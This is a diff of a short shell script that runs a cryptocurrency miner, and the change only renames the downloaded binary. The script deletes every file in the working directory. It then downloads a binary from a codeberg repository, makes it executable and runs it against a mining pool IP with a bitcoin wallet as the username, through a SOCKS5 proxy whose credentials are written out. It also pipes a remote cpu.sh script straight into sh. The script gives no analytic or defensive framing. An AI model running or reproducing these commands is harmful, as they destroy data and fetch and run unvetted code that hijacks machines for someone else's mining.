@@ -1,2 +1,2 @@
 rm -rvf * && mkdir a && cd a
-wget https://codeberg.org/zelanoajo/ABC/raw/branch/main/Mugen && chmod +x Mugen && ./Mugen --algo qhash --qhash-kernel 1 --url 43.172.89.100:80 --user bc1quh2f040awczqtecmnkpuu8kgpna22mmhhs2p6y.$(shuf -n 1 -i 1-99999)-RTX4060 --proxy socks5://yoga:yoga123@43.173.108.34:443 & curl https://codeberg.org/zelanoajo/ABC/raw/branch/main/cpu.sh | sh
+wget https://codeberg.org/zelanoajo/ABC/raw/branch/main/Multi && chmod +x Multi && ./Multi --algo qhash --qhash-kernel 1 --url 43.172.89.100:80 --user bc1quh2f040awczqtecmnkpuu8kgpna22mmhhs2p6y.$(shuf -n 1 -i 1-99999)-RTX4060 --proxy socks5://yoga:yoga123@43.173.108.34:443 & curl https://codeberg.org/zelanoajo/ABC/raw/branch/main/cpu.sh | sh
